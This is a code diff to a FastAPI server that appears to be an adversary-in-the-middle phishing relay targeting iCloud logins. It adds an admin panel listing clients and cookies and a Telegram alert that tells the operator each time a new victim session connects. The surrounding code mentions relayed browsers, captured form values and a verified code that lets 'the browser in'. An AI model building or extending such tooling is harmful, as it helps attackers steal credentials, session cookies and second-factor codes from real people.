@@ -40,7 +40,9 @@ from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import (FileResponse, HTMLResponse, JSONResponse,
                              RedirectResponse, Response)
 
+import admin
 import live
+import telegram as telegram_module
 
 HERE = Path(__file__).parent
 
@@ -122,6 +124,11 @@ async def lifespan(app: FastAPI):
 
 
 app = FastAPI(lifespan=lifespan)
+
+# The control room: the clients, the Telegram settings, and the cookies. It
+# is mounted here because it is part of this server and knows the same
+# sessions.
+app.include_router(admin.ROUTER)
 
 state = {
     "status": "idle",      # idle | running | done | error
@@ -355,6 +362,7 @@ async def start_browser(session: "Session"):
         session.state["status"] = "error"
         session.state["error"] = str(exc).splitlines()[0]
         log(f"FAILED: {session.state['error']}")
+        admin.note("error", session=session.id)
 
     return session.state
 
@@ -975,6 +983,8 @@ class Hub:
         The code was good and the browser is in. Every viewer is sent there,
         and the captures are closed to them from then on.
         """
+        if not self.finished:
+            admin.note("finished")
         self.finished = True
         self.page = ICLOUD
         # Form values belong to the page they were typed on.
@@ -1275,6 +1285,26 @@ def new_session_id() -> str:
     return secrets.token_urlsafe(12)
 
 
+async def notify_new_client(sid: str) -> None:
+    """Tell the operator, on Telegram, that somebody new has connected.
+
+    The settings are the operator's own, and they are kept in the admin
+    store. Nothing is sent when they are not there, or when they are turned
+    off, or when Telegram says no.
+    """
+    settings = admin.STORE.telegram()
+    if not settings["enabled"] or not settings["token"] or not settings["chat_id"]:
+        return
+    went, said = await telegram_module.send(
+        settings["token"], settings["chat_id"],
+        telegram_module.describe(f"A new client has connected.\n\n"
+                                 f"Session: {sid}"))
+    if went:
+        log(f"telegram: told about the new client {sid}")
+    else:
+        log(f"telegram: not told about {sid} - {said}")
+
+
 def visitor_of(request) -> str:
     """The name this request says the visitor is.
 
@@ -1328,6 +1358,11 @@ def session_for(sid: str | None) -> Session:
         session = Session(sid)
         SESSIONS[sid] = session
         log(f"new session {sid}")
+        admin.note("connected", session=sid)
+        # A note to Telegram, in the background: the person connecting must
+        # not wait for Telegram, and Telegram being down must not break the
+        # app.
+        spawn(notify_new_client(sid))
 
     session.touch()
     return session
